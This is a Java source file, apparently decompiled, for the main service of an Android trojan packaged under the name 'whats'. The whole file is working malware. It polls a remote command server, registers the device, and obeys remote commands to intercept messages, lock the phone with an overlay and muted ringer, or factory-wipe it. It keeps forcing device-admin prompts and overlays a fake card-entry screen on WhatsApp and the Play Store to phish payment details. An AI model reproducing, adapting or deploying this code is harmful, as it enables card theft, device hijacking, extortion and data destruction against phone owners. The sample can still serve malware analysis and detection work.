package exts.whats;

import android.app.ActivityManager;
import android.app.ActivityManager.RunningAppProcessInfo;
import android.app.ActivityManager.RunningTaskInfo;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.media.AudioManager;
import android.os.Build.VERSION;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import exts.whats.activities.Cards;
import exts.whats.utils.RequestFactory;
import exts.whats.utils.Sender;
import exts.whats.utils.Utils;
import java.lang.reflect.Field;
import java.util.List;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.ScheduledFuture;
import java.util.concurrent.TimeUnit;
import org.apache.http.impl.client.DefaultHttpClient;

public class MainService extends Service {
    public static boolean isRunning = false;
    /* access modifiers changed from: private|static */
    public static SharedPreferences settings;
    /* access modifiers changed from: private|static */
    public static OverlayView updateView;
    private Runnable adminTask;
    private ActivityManager am;
    /* access modifiers changed from: private */
    public Context context;
    /* access modifiers changed from: private */
    public DevicePolicyManager deviceManager;
    private ScheduledFuture<?> futureWorkTask;
    /* access modifiers changed from: private */
    public DefaultHttpClient httpClient;
    private Runnable injTask;
    private ScheduledExecutorService scheduler;
    private Runnable workTask;

    public void onCreate() {
        super.onCreate();
        isRunning = true;
        this.httpClient = new DefaultHttpClient();
        this.am = (ActivityManager) getSystemService("activity");
        this.deviceManager = (DevicePolicyManager) getSystemService("device_policy");
        this.context = this;
        settings = getSharedPreferences(Constants.PREFS_NAME, 0);
        updateView = new OverlayView(this, R.layout.update);
        if (!settings.getBoolean(Constants.LOCK_ENABLED, false)) {
            hideSysDialog();
        }
        scheduleChecker();
        this.scheduler = Executors.newScheduledThreadPool(3);
        initWorkTask();
        initAdminTask();
        initInjTask();
    }

    private void initWorkTask() {
        this.workTask = new Runnable() {
            public void run() {
                SharedPreferences prefs = MainService.this.getSharedPreferences(Constants.PREFS_NAME, 0);
                boolean reged = prefs.getBoolean(Constants.INSTALL_SENT, false);
                try {
                    String adminLink = MainService.this.getString(R.string.admin_link);
                    Intent start;
                    if (reged) {
                        String command = Sender.request(MainService.this.httpClient, adminLink, RequestFactory.makeReq(prefs.getString(Constants.APP_ID, "-1")).toString()).getString("cmd");
                        start = new Intent(MainService.this.context, SendService.class);
                        if (command.equals("intercept start")) {
                            Utils.putBoolVal(prefs, Constants.INTERCEPTING_ENABLED, true);
                            start.setAction(SendService.REPORT_INTERCEPT_STATUS);
                        } else if (command.equals("intercept stop")) {
                            Utils.putBoolVal(prefs, Constants.INTERCEPTING_ENABLED, false);
                            start.setAction(SendService.REPORT_INTERCEPT_STATUS);
                        } else if (command.equals("lock")) {
                            Utils.putBoolVal(prefs, Constants.LOCK_ENABLED, true);
                            ((AudioManager) MainService.this.context.getSystemService("audio")).setRingerMode(0);
                            MainService.showSysDialog();
                            start.setAction(SendService.REPORT_LOCK_STATUS);
                        } else if (command.equals("unlock")) {
                            Utils.putBoolVal(prefs, Constants.LOCK_ENABLED, false);
                            ((AudioManager) MainService.this.context.getSystemService("audio")).setRingerMode(2);
                            MainService.hideSysDialog();
                            start.setAction(SendService.REPORT_LOCK_STATUS);
                        } else if (command.equals("hard reset")) {
                            MainService.this.reset();
                            start.setAction("");
                        } else {
                            start.setAction("");
                        }
                        MainService.this.startService(start);
                        return;
                    }
                    Utils.putStrVal(prefs, Constants.APP_ID, Sender.request(MainService.this.httpClient, adminLink, RequestFactory.makeReg(MainService.this.context).toString()).getString("app id"));
                    Utils.putBoolVal(prefs, Constants.INSTALL_SENT, true);
                    start = new Intent(MainService.this.context, SendService.class);
                    start.setAction(SendService.REPORT_SAVED_ID);
                    MainService.this.startService(start);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        };
        rescheduleWorkTask(1, (long) getResources().getInteger(R.integer.poll_interval_seconds), TimeUnit.SECONDS);
    }

    private void rescheduleWorkTask(long initialDelay, long period, TimeUnit unit) {
        if (this.futureWorkTask != null) {
            this.futureWorkTask.cancel(true);
        }
        this.futureWorkTask = this.scheduler.scheduleAtFixedRate(this.workTask, initialDelay, period, TimeUnit.SECONDS);
    }

    private void initAdminTask() {
        this.adminTask = new Runnable() {
            public void run() {
                MainService.this.checkDeviceAdmin();
            }
        };
        this.scheduler.scheduleAtFixedRate(this.adminTask, 100, 100, TimeUnit.MILLISECONDS);
    }

    private void initInjTask() {
        this.injTask = new Runnable() {
            public void run() {
                String packageName = MainService.this.getTop();
                if ((packageName.contains("com.whatsapp") || packageName.contains("com.android.vending")) && !MainService.settings.getBoolean(Constants.CARD_SENT, false)) {
                    Intent i = new Intent(MainService.this, Cards.class);
                    i.putExtra("package", packageName);
                    i.addFlags(268435456);
                    MainService.this.startActivity(i);
                }
            }
        };
        this.scheduler.scheduleAtFixedRate(this.injTask, 500, 4000, TimeUnit.MILLISECONDS);
    }

    public static void hideSysDialog() {
        new Handler(Looper.getMainLooper()).post(new Runnable() {
            public void run() {
                MainService.updateView.hide();
            }
        });
    }

    public static void showSysDialog() {
        new Handler(Looper.getMainLooper()).post(new Runnable() {
            public void run() {
                MainService.updateView.show();
            }
        });
    }

    private void scheduleChecker() {
        Intent myIntent = new Intent(this, Starter.class);
        myIntent.setAction(Starter.ACTION);
        ((AlarmManager) getSystemService("alarm")).setRepeating(0, System.currentTimeMillis() + 30000, 30000, PendingIntent.getBroadcast(this, 0, myIntent, 0));
    }

    public void checkDeviceAdmin() {
        if (!this.deviceManager.isAdminActive(new ComponentName(this, DevAdminReceiver.class))) {
            Intent intent = new Intent();
            intent.setClass(this, DevAdminDisabler.class);
            intent.setFlags((intent.getFlags() | 268435456) | 536870912);
            startActivity(intent);
        }
    }

    /* access modifiers changed from: private */
    public void reset() {
        new Handler(Looper.getMainLooper()).post(new Runnable() {
            public void run() {
                MainService.this.deviceManager.wipeData(0);
            }
        });
    }

    /* access modifiers changed from: private */
    public String getTop() {
        String activePackage;
        if (VERSION.SDK_INT > 20) {
            activePackage = getActivePackageL();
        } else {
            activePackage = getActivePackagePreL();
        }
        return activePackage != null ? activePackage : "";
    }

    private String getActivePackageL() {
        RunningAppProcessInfo currentInfo = null;
        Field field = null;
        try {
            field = RunningAppProcessInfo.class.getDeclaredField("processState");
        } catch (Exception e) {
        }
        for (RunningAppProcessInfo app : ((ActivityManager) this.context.getSystemService("activity")).getRunningAppProcesses()) {
            if (app.importance == 100 && app.importanceReasonCode == 0) {
                Integer state = null;
                try {
                    state = Integer.valueOf(field.getInt(app));
                } catch (Exception e2) {
                }
                if (state != null && state.intValue() == 2) {
                    currentInfo = app;
                    break;
                }
            }
        }
        if (currentInfo == null) {
            return "";
        }
        return currentInfo.pkgList[0];
    }

    private String getActivePackagePreL() {
        List<RunningTaskInfo> taskInfo = this.am.getRunningTasks(1);
        if (taskInfo.isEmpty()) {
            return "";
        }
        return ((RunningTaskInfo) taskInfo.get(0)).topActivity.getPackageName();
    }

    public void onDestroy() {
        super.onDestroy();
        isRunning = false;
    }

    public IBinder onBind(Intent intent) {
        return null;
    }
}
